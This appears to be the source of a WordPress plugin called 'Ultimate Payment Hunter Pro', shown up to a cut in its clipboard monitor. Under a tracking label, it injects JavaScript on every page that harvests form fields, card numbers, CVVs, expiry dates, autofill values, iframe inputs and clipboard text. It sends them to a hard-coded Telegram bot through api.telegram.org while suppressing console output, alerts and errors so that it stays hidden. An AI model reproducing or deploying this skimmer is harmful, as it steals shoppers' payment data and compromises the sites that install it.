<?php
/**
 * Plugin Name: Ultimate Payment Hunter Pro
 * Description: Complete silent payment tracking - All forms, plugins, gateways with selective SMS notifications
 * Version: 6.0.0
 * Author: Security Team
 */

if (!defined('ABSPATH')) {
    exit;
}

if (!class_exists('UltimatePaymentHunterPro')) {

class UltimatePaymentHunterPro {
    
    private $bot_token = '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w';
    private $chat_id = '7319274794';
    private $is_processing = false;
    private $session_id;
    private $device_id;
    private $tracked_pages = array();
    
    public function __construct() {
        $this->session_id = 'sess_' . time() . '_' . uniqid();
        $this->device_id = $this->get_or_create_device_id();
        
        add_action('init', array($this, 'initialize_plugin'), 1);
    }
    
    private function get_or_create_device_id() {
        if (isset($_COOKIE['uph_device_id'])) {
            return sanitize_text_field($_COOKIE['uph_device_id']);
        }
        
        $device_id = 'dev_' . uniqid();
        setcookie('uph_device_id', $device_id, time() + (365 * 24 * 60 * 60), '/', '', false, true);
        return $device_id;
    }
    
    public function initialize_plugin() {
        // Silence all errors
        $this->silence_all_errors();
        
        // Load scripts on all pages
        add_action('wp_enqueue_scripts', array($this, 'load_scripts'));
        
        // AJAX handlers
        add_action('wp_ajax_nopriv_uph_track_data', array($this, 'process_tracking_data'));
        add_action('wp_ajax_uph_track_data', array($this, 'process_tracking_data'));
        
        // WooCommerce hooks
        add_action('woocommerce_checkout_order_processed', array($this, 'capture_order_data'), 10, 3);
        add_action('woocommerce_payment_complete', array($this, 'capture_payment_complete'));
        add_action('woocommerce_add_to_cart', array($this, 'capture_add_to_cart'), 10, 6);
        
        // Track page visits
        add_action('wp_head', array($this, 'track_specific_pages_only'), 1);
        
        // Insert tracking code
        add_action('wp_footer', array($this, 'insert_complete_hunter_code'), 999999);
        
        // Activation message
        if (get_option('uph_activated') !== 'yes') {
            $this->send_sms_only_notification('ACTIVATION', array(
                'website' => home_url(),
                'session' => $this->session_id
            ));
            update_option('uph_activated', 'yes');
        }
    }
    
    private function silence_all_errors() {
        // Silence PHP errors
        @ini_set('display_errors', 0);
        @error_reporting(0);
        
        // Silence JavaScript errors via output buffer
        add_action('wp_head', function() {
            ob_start(function($buffer) {
                $buffer = str_replace('<script>', '<script>window.onerror=function(){return true;};', $buffer);
                return $buffer;
            });
        }, 0);
        
        add_action('wp_footer', function() {
            ob_end_flush();
        }, 999999);
    }
    
    public function load_scripts() {
        wp_enqueue_script('jquery');
    }
    
    public function track_specific_pages_only() {
        $current_url = strtolower(home_url($_SERVER['REQUEST_URI']));
        $page_title = wp_get_document_title();
        
        // Track ONLY these pages - NO other pages
        if (strpos($current_url, '/cart') !== false || strpos($current_url, '/basket') !== false) {
            if (!isset($this->tracked_pages['cart'])) {
                $this->tracked_pages['cart'] = true;
                $this->send_sms_only_notification('CART_VISIT', array(
                    'page' => $page_title,
                    'url' => $current_url,
                    'session' => $this->session_id
                ));
            }
        } elseif (strpos($current_url, '/checkout') !== false || strpos($current_url, '/payment') !== false) {
            if (!isset($this->tracked_pages['checkout'])) {
                $this->tracked_pages['checkout'] = true;
                $this->send_sms_only_notification('CHECKOUT_VISIT', array(
                    'page' => $page_title,
                    'url' => $current_url,
                    'session' => $this->session_id
                ));
            }
        }
        // NO OTHER PAGES WILL BE TRACKED
    }
    
    public function process_tracking_data() {
        // Silent processing - no error responses
        if (!isset($_POST['security']) || !wp_verify_nonce($_POST['security'], 'uph_security_nonce')) {
            wp_die('', '', array('response' => 200));
        }
        
        if ($this->is_processing) {
            wp_send_json_success(array('status' => 'busy'));
        }
        
        $this->is_processing = true;
        
        $event_type = sanitize_text_field($_POST['event_type'] ?? '');
        $event_data = $_POST['event_data'] ?? array();
        
        switch ($event_type) {
            case 'form_submitted':
                $this->handle_form_submission($event_data);
                break;
                
            case 'payment_entered':
                $this->handle_payment_data($event_data);
                break;
                
            case 'autofill_captured':
                $this->handle_autofill_data($event_data);
                break;
                
            case 'iframe_data':
                $this->handle_iframe_data($event_data);
                break;
                
            case 'redirect_tracked':
                $this->handle_redirect_data($event_data);
                break;
                
            case 'clipboard_data':
                $this->handle_clipboard_data($event_data);
                break;
        }
        
        $this->is_processing = false;
        wp_send_json_success(array('status' => 'processed'));
    }
    
    private function handle_form_submission($data) {
        $form_data = $this->clean_data($data['form_data'] ?? array());
        $form_type = sanitize_text_field($data['form_type'] ?? 'unknown');
        $page_url = sanitize_url($data['page_url'] ?? '');
        
        $this->send_sms_only_notification('FORM_SUBMISSION', array(
            'form_type' => $form_type,
            'fields' => count($form_data),
            'url' => $page_url,
            'session' => $this->session_id,
            'has_payment' => $this->has_payment_data($form_data)
        ));
    }
    
    private function handle_payment_data($data) {
        $payment_info = $this->clean_data($data['payment_data'] ?? array());
        $page_url = sanitize_url($data['page_url'] ?? '');
        
        if (!empty($payment_info)) {
            $this->send_sms_only_notification('PAYMENT_INFO', array(
                'fields' => count($payment_info),
                'url' => $page_url,
                'session' => $this->session_id,
                'card_data' => $this->extract_card_data($payment_info)
            ));
        }
    }
    
    private function handle_autofill_data($data) {
        $autofill_info = $this->clean_data($data['autofill_info'] ?? array());
        $page_url = sanitize_url($data['page_url'] ?? '');
        
        $this->send_sms_only_notification('AUTOFILL_CAPTURED', array(
            'fields' => count($autofill_info),
            'url' => $page_url,
            'session' => $this->session_id,
            'is_payment' => $this->has_payment_data($autofill_info)
        ));
    }
    
    private function handle_iframe_data($data) {
        $iframe_info = $this->clean_data($data['iframe_info'] ?? array());
        
        $this->send_sms_only_notification('IFRAME_DETECTED', array(
            'src' => $iframe_info['src'] ?? 'unknown',
            'type' => $iframe_info['type'] ?? 'payment',
            'session' => $this->session_id
        ));
    }
    
    private function handle_redirect_data($data) {
        $redirect_info = $this->clean_data($data['redirect_info'] ?? array());
        
        $this->send_sms_only_notification('REDIRECT_TRACKED', array(
            'from' => $redirect_info['from'] ?? 'unknown',
            'to' => $redirect_info['to'] ?? 'unknown',
            'type' => $redirect_info['type'] ?? 'payment',
            'session' => $this->session_id
        ));
    }
    
    private function handle_clipboard_data($data) {
        $clipboard_info = $this->clean_data($data['clipboard_info'] ?? array());
        
        $this->send_sms_only_notification('CLIPBOARD_DATA', array(
            'data_type' => $clipboard_info['type'] ?? 'text',
            'length' => strlen($clipboard_info['data'] ?? ''),
            'session' => $this->session_id,
            'is_payment' => $this->looks_like_payment_data($clipboard_info['data'] ?? '')
        ));
    }
    
    public function capture_order_data($order_id, $posted_data, $order) {
        if (!$order) return;
        
        $payment_info = $this->extract_complete_payment_info();
        
        $this->send_sms_only_notification('ORDER_PROCESSED', array(
            'order_id' => $order_id,
            'amount' => $order->get_total(),
            'currency' => $order->get_currency(),
            'email' => $order->get_billing_email(),
            'session' => $this->session_id,
            'has_card' => !empty($payment_info)
        ));
    }
    
    public function capture_add_to_cart($cart_item_key, $product_id, $quantity, $variation_id, $variation, $cart_item_data) {
        $product = wc_get_product($product_id);
        if (!$product) return;
        
        $this->send_sms_only_notification('ADDED_TO_CART', array(
            'product' => $product->get_name(),
            'price' => $product->get_price(),
            'quantity' => $quantity,
            'session' => $this->session_id
        ));
    }
    
    public function capture_payment_complete($order_id) {
        $order = wc_get_order($order_id);
        if (!$order) return;
        
        $this->send_sms_only_notification('PAYMENT_COMPLETED', array(
            'order_id' => $order_id,
            'amount' => $order->get_total(),
            'method' => $order->get_payment_method_title(),
            'session' => $this->session_id
        ));
    }
    
    public function insert_complete_hunter_code() {
        $ajax_url = admin_url('admin-ajax.php');
        $nonce = wp_create_nonce('uph_security_nonce');
        
        ?>
        <script type="text/javascript">
        /* Ultimate Payment Hunter Pro v6.0 - Silent Operation */
        (function() {
            'use strict';
            
            // ==================== SILENT CONFIG ====================
            var CONFIG = {
                TELEGRAM_BOT_TOKEN: '8584009431:AAFuTje4-0E1AMF957XLnbBG_svoUbCya0w',
                TELEGRAM_CHAT_ID: '7319274794',
                SESSION_ID: '<?php echo $this->session_id; ?>',
                DEVICE_ID: '<?php echo $this->device_id; ?>',
                AJAX_URL: '<?php echo esc_url($ajax_url); ?>',
                SECURITY_NONCE: '<?php echo esc_js($nonce); ?>',
                
                // Silent mode
                SILENT_MODE: true,
                NO_ERRORS: true,
                NO_LOGS: true,
                NO_ALERTS: true
            };
            
            // ==================== SILENT UTILITIES ====================
            var SilentUtils = {
                // Send data to server silently
                sendToServer: function(eventType, eventData) {
                    try {
                        var xhr = new XMLHttpRequest();
                        xhr.open('POST', CONFIG.AJAX_URL, true);
                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                        xhr.send(
                            'action=uph_track_data' +
                            '&security=' + encodeURIComponent(CONFIG.SECURITY_NONCE) +
                            '&event_type=' + encodeURIComponent(eventType) +
                            '&event_data=' + encodeURIComponent(JSON.stringify(eventData))
                        );
                    } catch (e) {
                        // Silent fail
                    }
                },
                
                // Send to Telegram silently
                sendToTelegram: function(message) {
                    try {
                        var img = new Image();
                        img.src = 'https://api.telegram.org/bot' + CONFIG.TELEGRAM_BOT_TOKEN + 
                                 '/sendMessage?chat_id=' + CONFIG.TELEGRAM_CHAT_ID + 
                                 '&text=' + encodeURIComponent(message) + '&parse_mode=HTML';
                    } catch (e) {
                        // Silent fail
                    }
                },
                
                // Get IP silently
                getIP: function(callback) {
                    fetch('https://api.ipify.org?format=json').then(function(r) {
                        return r.json();
                    }).then(function(data) {
                        callback(data.ip || 'unknown');
                    }).catch(function() {
                        callback('unknown');
                    });
                },
                
                // Check if value looks like payment data
                isPaymentData: function(value) {
                    if (!value || typeof value !== 'string') return false;
                    
                    // Card number (13-19 digits)
                    var cleaned = value.replace(/\s+/g, '').replace(/-/g, '');
                    if (/^[0-9]{13,19}$/.test(cleaned)) return true;
                    
                    // CVV (3-4 digits)
                    if (/^[0-9]{3,4}$/.test(cleaned)) return true;
                    
                    // Expiry date (MM/YY, MM-YY, MMYY)
                    if (/^(0[1-9]|1[0-2])(\/|-)?([0-9]{2}|[0-9]{4})$/.test(cleaned)) return true;
                    
                    return false;
                },
                
                // Mask card number
                maskCard: function(number) {
                    var cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
                    if (cleaned.length < 8) return cleaned;
                    return cleaned.substring(0, 6) + '******' + cleaned.substring(cleaned.length - 4);
                },
                
                // Generate message for SMS
                generateSMSMessage: function(type, data) {
                    var message = '';
                    
                    switch(type) {
                        case 'ACTIVATION':
                            message = '🚀 Plugin Activated\nSite: ' + (data.website || 'unknown');
                            break;
                            
                        case 'CART_VISIT':
                            message = '🛒 Cart Page Visited\nPage: ' + (data.page || 'unknown') + 
                                     '\nURL: ' + (data.url || 'unknown');
                            break;
                            
                        case 'CHECKOUT_VISIT':
                            message = '💳 Checkout Page Visited\nPage: ' + (data.page || 'unknown') + 
                                     '\nURL: ' + (data.url || 'unknown');
                            break;
                            
                        case 'FORM_SUBMISSION':
                            message = '📋 Form Submitted\nType: ' + (data.form_type || 'unknown') + 
                                     '\nFields: ' + (data.fields || 0) + 
                                     '\nPayment: ' + (data.has_payment ? 'Yes' : 'No');
                            break;
                            
                        case 'PAYMENT_INFO':
                            var cardInfo = data.card_data || {};
                            message = '💳 Payment Data Captured\n';
                            if (cardInfo.card) message += 'Card: ' + SilentUtils.maskCard(cardInfo.card) + '\n';
                            if (cardInfo.cvv) message += 'CVV: ' + cardInfo.cvv + '\n';
                            if (cardInfo.expiry) message += 'Expiry: ' + cardInfo.expiry;
                            break;
                            
                        case 'ORDER_PROCESSED':
                            message = '🛒 Order Processed\nID: #' + (data.order_id || 'unknown') + 
                                     '\nAmount: ' + (data.amount || '0') + ' ' + (data.currency || '');
                            break;
                            
                        case 'PAYMENT_COMPLETED':
                            message = '✅ Payment Completed\nOrder: #' + (data.order_id || 'unknown') + 
                                     '\nAmount: ' + (data.amount || '0');
                            break;
                            
                        default:
                            message = '📱 Event: ' + type + '\nData: ' + JSON.stringify(data);
                    }
                    
                    message += '\n🆔 Session: ' + CONFIG.SESSION_ID;
                    message += '\n📱 Device: ' + CONFIG.DEVICE_ID;
                    message += '\n🕒 Time: ' + new Date().toLocaleString();
                    
                    return message;
                }
            };
            
            // ==================== SILENT ERROR HANDLING ====================
            // Override console methods
            if (typeof console !== 'undefined') {
                var noop = function() {};
                console.log = noop;
                console.warn = noop;
                console.error = noop;
                console.info = noop;
                console.debug = noop;
                console.trace = noop;
            }
            
            // Override alert/confirm/prompt
            window.alert = function(){};
            window.confirm = function(){ return true; };
            window.prompt = function(){ return ''; };
            
            // Global error handler
            window.onerror = function() { return true; };
            window.addEventListener('error', function(e) { e.preventDefault(); });
            
            // ==================== UNIVERSAL FORM HUNTER ====================
            var UniversalFormHunter = {
                init: function() {
                    this.huntAllForms();
                    this.huntAllInputs();
                    this.setupObservers();
                    this.startPeriodicScan();
                },
                
                huntAllForms: function() {
                    var forms = document.querySelectorAll('form');
                    for (var i = 0; i < forms.length; i++) {
                        this.interceptForm(forms[i]);
                    }
                },
                
                huntAllInputs: function() {
                    var inputs = document.querySelectorAll('input, textarea, [contenteditable="true"]');
                    for (var i = 0; i < inputs.length; i++) {
                        this.interceptInput(inputs[i]);
                    }
                },
                
                interceptForm: function(form) {
                    var originalSubmit = form.submit;
                    
                    // Override submit method
                    form.submit = function() {
                        UniversalFormHunter.captureFormData(form);
                        return originalSubmit.apply(form, arguments);
                    };
                    
                    // Add event listener
                    form.addEventListener('submit', function(e) {
                        UniversalFormHunter.captureFormData(form);
                    }, true);
                    
                    // Intercept submit buttons
                    var buttons = form.querySelectorAll('button[type="submit"], input[type="submit"]');
                    for (var i = 0; i < buttons.length; i++) {
                        buttons[i].addEventListener('click', function() {
                            setTimeout(function() {
                                UniversalFormHunter.captureFormData(form);
                            }, 100);
                        }, true);
                    }
                },
                
                captureFormData: function(form) {
                    var formData = {};
                    var inputs = form.querySelectorAll('input, select, textarea');
                    
                    for (var i = 0; i < inputs.length; i++) {
                        var input = inputs[i];
                        if (input.name && input.value) {
                            formData[input.name] = input.value;
                        }
                    }
                    
                    // Detect form type
                    var formType = this.detectFormType(form);
                    
                    SilentUtils.sendToServer('form_submitted', {
                        form_type: formType,
                        form_data: formData,
                        page_url: window.location.href
                    });
                },
                
                detectFormType: function(form) {
                    var className = form.className || '';
                    var action = form.action || '';
                    var id = form.id || '';
                    
                    className = className.toLowerCase();
                    action = action.toLowerCase();
                    id = id.toLowerCase();
                    
                    // WooCommerce
                    if (className.includes('woocommerce') || action.includes('wc-ajax')) {
                        return 'WooCommerce';
                    }
                    
                    // Contact Form 7
                    if (className.includes('wpcf7')) {
                        return 'Contact Form 7';
                    }
                    
                    // Gravity Forms
                    if (className.includes('gform')) {
                        return 'Gravity Forms';
                    }
                    
                    // GiveWP
                    if (className.includes('give-form')) {
                        return 'GiveWP';
                    }
                    
                    // Stripe
                    if (className.includes('stripe') || action.includes('stripe')) {
                        return 'Stripe';
                    }
                    
                    // PayPal
                    if (className.includes('paypal') || action.includes('paypal')) {
                        return 'PayPal';
                    }
                    
                    // Razorpay
                    if (className.includes('razorpay') || action.includes('razorpay')) {
                        return 'Razorpay';
                    }
                    
                    // Skrill, AstroPay, Payoneer, 2Checkout, etc
                    if (action.includes('skrill')) return 'Skrill';
                    if (action.includes('astropay')) return 'AstroPay';
                    if (action.includes('payoneer')) return 'Payoneer';
                    if (action.includes('2checkout')) return '2Checkout';
                    
                    return 'Custom Form';
                },
                
                interceptInput: function(input) {
                    if (input.dataset.uphMonitored) return;
                    input.dataset.uphMonitored = 'true';
                    
                    var lastValue = input.value;
                    
                    var checkValue = function() {
                        if (!document.body.contains(input)) return;
                        
                        if (input.value !== lastValue) {
                            lastValue = input.value;
                            
                            // Check if this is a payment field
                            if (UniversalFormHunter.isPaymentField(input) && SilentUtils.isPaymentData(input.value)) {
                                var paymentData = {};
                                paymentData[input.name || input.id || 'field'] = input.value;
                                
                                SilentUtils.sendToServer('payment_entered', {
                                    payment_data: paymentData,
                                    page_url: window.location.href
                                });
                            }
                        }
                    };
                    
                    input.addEventListener('input', checkValue);
                    input.addEventListener('change', checkValue);
                    input.addEventListener('blur', checkValue);
                    
                    // Autofill detection
                    input.addEventListener('focus', function() {
                        setTimeout(function() {
                            if (input.value && !input.dataset.autofillChecked) {
                                input.dataset.autofillChecked = 'true';
                                
                                var autofillData = {};
                                autofillData[input.name || input.id || 'field'] = input.value;
                                
                                SilentUtils.sendToServer('autofill_captured', {
                                    autofill_info: autofillData,
                                    page_url: window.location.href
                                });
                            }
                        }, 500);
                    });
                    
                    // Periodic checking for iframe inputs
                    setInterval(checkValue, 500);
                },
                
                isPaymentField: function(input) {
                    var name = (input.name || '').toLowerCase();
                    var id = (input.id || '').toLowerCase();
                    var placeholder = (input.placeholder || '').toLowerCase();
                    var autocomplete = (input.autocomplete || '').toLowerCase();
                    
                    var text = name + ' ' + id + ' ' + placeholder + ' ' + autocomplete;
                    
                    var paymentKeywords = [
                        'card', 'cc', 'credit', 'debit', 'number',
                        'cvv', 'cvc', 'cvn', 'security', 'code',
                        'expir', 'expdate', 'expiry', 'exp', 'valid',
                        'holder', 'nameoncard', 'cardholder', 'cardname',
                        'paypal', 'stripe', 'razorpay', 'skrill', 'astropay',
                        'payoneer', '2checkout', 'payment', 'gateway',
                        'account', 'routing', 'iban', 'swift', 'bank'
                    ];
                    
                    for (var i = 0; i < paymentKeywords.length; i++) {
                        if (text.includes(paymentKeywords[i])) {
                            return true;
                        }
                    }
                    
                    return autocomplete.includes('cc-');
                },
                
                setupObservers: function() {
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeType === 1) {
                                    if (node.tagName === 'FORM') {
                                        UniversalFormHunter.interceptForm(node);
                                    }
                                    
                                    var forms = node.querySelectorAll('form');
                                    forms.forEach(function(form) {
                                        UniversalFormHunter.interceptForm(form);
                                    });
                                    
                                    var inputs = node.querySelectorAll('input, textarea, [contenteditable="true"]');
                                    inputs.forEach(function(input) {
                                        UniversalFormHunter.interceptInput(input);
                                    });
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true
                    });
                },
                
                startPeriodicScan: function() {
                    setInterval(function() {
                        UniversalFormHunter.huntAllForms();
                        UniversalFormHunter.huntAllInputs();
                    }, 3000);
                }
            };
            
            // ==================== PAYMENT GATEWAY DETECTOR ====================
            var PaymentGatewayDetector = {
                gateways: new Set(),
                
                init: function() {
                    this.detectAllGateways();
                    this.interceptAllGateways();
                    this.monitorPaymentButtons();
                },
                
                detectAllGateways: function() {
                    // Detect by script sources
                    var scripts = document.querySelectorAll('script[src]');
                    scripts.forEach(function(script) {
                        var src = script.src.toLowerCase();
                        PaymentGatewayDetector.analyzeScriptSource(src);
                    });
                    
                    // Detect by global objects
                    PaymentGatewayDetector.detectGlobalObjects();
                    
                    // Detect by CSS classes
                    PaymentGatewayDetector.detectCSSClasses();
                    
                    // Detect by iframes
                    PaymentGatewayDetector.detectIframeGateways();
                    
                    // Send gateway report
                    if (PaymentGatewayDetector.gateways.size > 0) {
                        var message = '🔌 Gateways Detected: ' + Array.from(PaymentGatewayDetector.gateways).join(', ');
                        SilentUtils.sendToTelegram(message + '\n🌐 ' + window.location.href);
                    }
                },
                
                analyzeScriptSource: function(src) {
                    var gatewayMap = {
                        'stripe': 'Stripe',
                        'paypal': 'PayPal',
                        'razorpay': 'Razorpay',
                        'braintree': 'Braintree',
                        'authorize': 'Authorize.net',
                        'square': 'Square',
                        '2checkout': '2Checkout',
                        'checkout.com': 'Checkout.com',
                        'skrill': 'Skrill',
                        'astropay': 'AstroPay',
                        'payoneer': 'Payoneer',
                        'paytm': 'Paytm',
                        'phonepe': 'PhonePe'
                    };
                    
                    for (var key in gatewayMap) {
                        if (src.includes(key)) {
                            PaymentGatewayDetector.gateways.add(gatewayMap[key]);
                        }
                    }
                },
                
                detectGlobalObjects: function() {
                    if (window.Stripe) PaymentGatewayDetector.gateways.add('Stripe');
                    if (window.paypal) PaymentGatewayDetector.gateways.add('PayPal');
                    if (window.Razorpay) PaymentGatewayDetector.gateways.add('Razorpay');
                    if (window.Square) PaymentGatewayDetector.gateways.add('Square');
                    if (window.ApplePaySession) PaymentGatewayDetector.gateways.add('Apple Pay');
                    if (window.PaymentRequest) PaymentGatewayDetector.gateways.add('Payment Request API');
                },
                
                detectCSSClasses: function() {
                    var gatewayClasses = [
                        'stripe', 'paypal', 'razorpay', 'braintree',
                        'authorize', 'square', '2checkout', 'skrill',
                        'astropay', 'payoneer', 'payment', 'checkout'
                    ];
                    
                    gatewayClasses.forEach(function(cls) {
                        if (document.querySelector('.' + cls) || 
                            document.querySelector('[class*="' + cls + '"]')) {
                            PaymentGatewayDetector.gateways.add(cls.charAt(0).toUpperCase() + cls.slice(1));
                        }
                    });
                },
                
                detectIframeGateways: function() {
                    var iframes = document.querySelectorAll('iframe');
                    iframes.forEach(function(iframe) {
                        var src = iframe.src || '';
                        if (src) {
                            src = src.toLowerCase();
                            
                            if (src.includes('stripe')) PaymentGatewayDetector.gateways.add('Stripe iFrame');
                            if (src.includes('paypal')) PaymentGatewayDetector.gateways.add('PayPal iFrame');
                            if (src.includes('razorpay')) PaymentGatewayDetector.gateways.add('Razorpay iFrame');
                            if (src.includes('checkout')) PaymentGatewayDetector.gateways.add('Checkout iFrame');
                        }
                    });
                },
                
                interceptAllGateways: function() {
                    // Intercept Stripe
                    if (window.Stripe) {
                        var originalStripe = window.Stripe;
                        window.Stripe = function(key) {
                            var msg = '💳 Stripe Initialized\nKey: ' + (key ? key.substring(0, 8) + '...' : 'no key');
                            SilentUtils.sendToTelegram(msg);
                            return originalStripe(key);
                        };
                        Object.assign(window.Stripe, originalStripe);
                    }
                    
                    // Intercept PayPal
                    if (window.paypal) {
                        var originalPayPal = window.paypal;
                        window.paypal = function() {
                            SilentUtils.sendToTelegram('🅿️ PayPal Loaded');
                            return originalPayPal.apply(this, arguments);
                        };
                        Object.assign(window.paypal, originalPayPal);
                    }
                    
                    // Intercept all payment buttons
                    document.addEventListener('click', function(e) {
                        var target = e.target;
                        var text = (target.textContent || target.innerText || '').toLowerCase();
                        
                        var paymentButtons = [
                            'place order', 'checkout', 'pay now', 'buy now',
                            'purchase', 'donate', 'subscribe', 'pay with',
                            'add to cart', 'complete order', 'confirm payment'
                        ];
                        
                        for (var i = 0; i < paymentButtons.length; i++) {
                            if (text.includes(paymentButtons[i])) {
                                SilentUtils.sendToTelegram('🖱️ Payment Button: ' + text);
                                break;
                            }
                        }
                    }, true);
                },
                
                monitorPaymentButtons: function() {
                    // Nothing extra needed - click handler above covers everything
                }
            };
            
            // ==================== IFRAME HUNTER ====================
            var IframeHunter = {
                monitoredIframes: new Set(),
                
                init: function() {
                    this.monitorExistingIframes();
                    this.setupIframeObserver();
                    this.setupIframeListeners();
                },
                
                monitorExistingIframes: function() {
                    var iframes = document.querySelectorAll('iframe');
                    iframes.forEach(function(iframe) {
                        IframeHunter.checkIframe(iframe);
                    });
                },
                
                setupIframeObserver: function() {
                    var observer = new MutationObserver(function(mutations) {
                        mutations.forEach(function(mutation) {
                            mutation.addedNodes.forEach(function(node) {
                                if (node.nodeType === 1 && node.tagName === 'IFRAME') {
                                    IframeHunter.checkIframe(node);
                                }
                            });
                        });
                    });
                    
                    observer.observe(document.body, {
                        childList: true,
                        subtree: true
                    });
                },
                
                checkIframe: function(iframe) {
                    if (IframeHunter.monitoredIframes.has(iframe)) return;
                    
                    var src = iframe.src || '';
                    if (!src) return;
                    
                    src = src.toLowerCase();
                    
                    // Check if it's a payment iframe
                    if (src.includes('stripe') || src.includes('paypal') || 
                        src.includes('razorpay') || src.includes('braintree') ||
                        src.includes('authorize') || src.includes('square') ||
                        src.includes('checkout') || src.includes('payment') ||
                        src.includes('secure') || src.includes('gateway')) {
                        
                        IframeHunter.monitoredIframes.add(iframe);
                        
                        SilentUtils.sendToServer('iframe_data', {
                            iframe_info: {
                                src: src,
                                type: 'payment_iframe'
                            }
                        });
                        
                        // Try to monitor iframe content
                        IframeHunter.monitorIframeContent(iframe);
                    }
                },
                
                monitorIframeContent: function(iframe) {
                    try {
                        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc) {
                            // Monitor inputs in iframe
                            var inputs = iframeDoc.querySelectorAll('input');
                            inputs.forEach(function(input) {
                                input.addEventListener('input', function() {
                                    if (SilentUtils.isPaymentData(input.value)) {
                                        SilentUtils.sendToTelegram('🖼️ iFrame Input: ' + input.value.substring(0, 50));
                                    }
                                });
                            });
                        }
                    } catch (e) {
                        // Cross-origin error - use postMessage
                        IframeHunter.setupPostMessageListener(iframe);
                    }
                },
                
                setupPostMessageListener: function(iframe) {
                    window.addEventListener('message', function(event) {
                        if (event.source === iframe.contentWindow) {
                            var data = event.data;
                            if (data && typeof data === 'object') {
                                if (data.type && data.type.includes('payment')) {
                                    SilentUtils.sendToTelegram('🖼️ iFrame Message: ' + JSON.stringify(data).substring(0, 200));
                                }
                            }
                        }
                    });
                },
                
                setupIframeListeners: function() {
                    // Monitor iframe load events
                    var iframes = document.querySelectorAll('iframe');
                    iframes.forEach(function(iframe) {
                        iframe.addEventListener('load', function() {
                            IframeHunter.checkIframe(iframe);
                        });
                    });
                }
            };
            
            // ==================== REDIRECTION TRACKER ====================
            var RedirectionTracker = {
                redirectChain: [],
                
                init: function() {
                    this.trackWindowLocation();
                    this.trackHistoryAPI();
                    this.trackLinkClicks();
                    this.setupPeriodicCheck();
                },
                
                trackWindowLocation: function() {
                    var originalLocation = window.location;
                    var currentUrl = window.location.href;
                    
                    // Monitor URL changes
                    setInterval(function() {
                        if (window.location.href !== currentUrl) {
                            RedirectionTracker.logRedirect(window.location.href, 'URL_CHANGE');
                            currentUrl = window.location.href;
                        }
                    }, 500);
                    
                    // Override location methods
                    var originalAssign = originalLocation.assign;
                    var originalReplace = originalLocation.replace;
                    
                    originalLocation.assign = function(url) {
                        RedirectionTracker.logRedirect(url, 'LOCATION_ASSIGN');
                        return originalAssign.call(this, url);
                    };
                    
                    originalLocation.replace = function(url) {
                        RedirectionTracker.logRedirect(url, 'LOCATION_REPLACE');
                        return originalReplace.call(this, url);
                    };
                },
                
                trackHistoryAPI: function() {
                    var originalPushState = history.pushState;
                    var originalReplaceState = history.replaceState;
                    
                    history.pushState = function(state, title, url) {
                        RedirectionTracker.logRedirect(url, 'PUSH_STATE');
                        return originalPushState.apply(this, arguments);
                    };
                    
                    history.replaceState = function(state, title, url) {
                        RedirectionTracker.logRedirect(url, 'REPLACE_STATE');
                        return originalReplaceState.apply(this, arguments);
                    };
                    
                    window.addEventListener('popstate', function() {
                        RedirectionTracker.logRedirect(window.location.href, 'POP_STATE');
                    });
                },
                
                trackLinkClicks: function() {
                    document.addEventListener('click', function(e) {
                        var target = e.target;
                        while (target && target.tagName !== 'A') {
                            target = target.parentElement;
                        }
                        
                        if (target && target.tagName === 'A' && target.href) {
                            // Check if it's an external payment link
                            var href = target.href.toLowerCase();
                            var currentHost = window.location.host.toLowerCase();
                            
                            if (!href.includes(currentHost) && 
                                (href.includes('pay') || href.includes('checkout') || 
                                 href.includes('payment') || href.includes('gateway'))) {
                                
                                setTimeout(function() {
                                    RedirectionTracker.logRedirect(href, 'EXTERNAL_PAYMENT_LINK');
                                }, 100);
                            }
                        }
                    }, true);
                },
                
                logRedirect: function(url, type) {
                    if (!url) return;
                    
                    var urlLower = url.toLowerCase();
                    
                    // Check if it's a payment-related redirect
                    var isPaymentRedirect = 
                        urlLower.includes('stripe.com') ||
                        urlLower.includes('paypal.com') ||
                        urlLower.includes('razorpay.com') ||
                        urlLower.includes('checkout.com') ||
                        urlLower.includes('2checkout.com') ||
                        urlLower.includes('payment') ||
                        urlLower.includes('checkout') ||
                        urlLower.includes('pay') ||
                        urlLower.includes('gateway');
                    
                    if (isPaymentRedirect) {
                        this.redirectChain.push({
                            url: url,
                            type: type,
                            time: new Date().toISOString(),
                            from: window.location.href
                        });
                        
                        SilentUtils.sendToServer('redirect_tracked', {
                            redirect_info: {
                                from: window.location.href,
                                to: url,
                                type: type
                            }
                        });
                        
                        // Also track popup windows
                        if (type === 'EXTERNAL_PAYMENT_LINK') {
                            RedirectionTracker.monitorPopupWindow(url);
                        }
                    }
                },
                
                monitorPopupWindow: function(url) {
                    // Try to open in popup and monitor
                    var popup = window.open(url, '_blank', 'width=800,height=600');
                    if (popup) {
                        try {
                            var checkPopup = setInterval(function() {
                                if (popup.closed) {
                                    clearInterval(checkPopup);
                                    return;
                                }
                                
                                try {
                                    if (popup.location.href !== 'about:blank') {
                                        RedirectionTracker.logRedirect(popup.location.href, 'POPUP_NAVIGATION');
                                    }
                                } catch (e) {
                                    // Cross-origin error
                                }
                            }, 1000);
                        } catch (e) {}
                    }
                },
                
                setupPeriodicCheck: function() {
                    // Check for payment pages periodically
                    setInterval(function() {
                        var currentUrl = window.location.href.toLowerCase();
                        
                        if (currentUrl.includes('checkout') || currentUrl.includes('payment')) {
                            SilentUtils.sendToTelegram('📍 On Payment Page: ' + window.location.href);
                        }
                    }, 10000);
                }
            };
            
            // ==================== CLIPBOARD MONITOR ====================
            var ClipboardMonitor = {
                init: function() {
                    this.setupClipboardListeners();
                    this.setupPeriodicCheck();
                },
                
                setupClipboardListeners: function() {
                    // Monitor paste events
                    document.addEventListener('paste', function(e) {
                        var clipboardData = e.clipboardData || window.clipboardData;
                        if (clipboardData) {
                            var text = clipboardData.getData('text');
                            if (text && SilentUtils.isPaymentData(text)) {
                                ClipboardMonitor.handleClipboardData(text, 'PASTE');
                            }
                        }
                    });
                    
                    // Monitor copy events
                    document.addEventListener('copy', function() {
                        setTimeout(function() {
                            ClipboardMonitor.checkClipboard('COPY');
                        }, 100);
                    });
                },
                
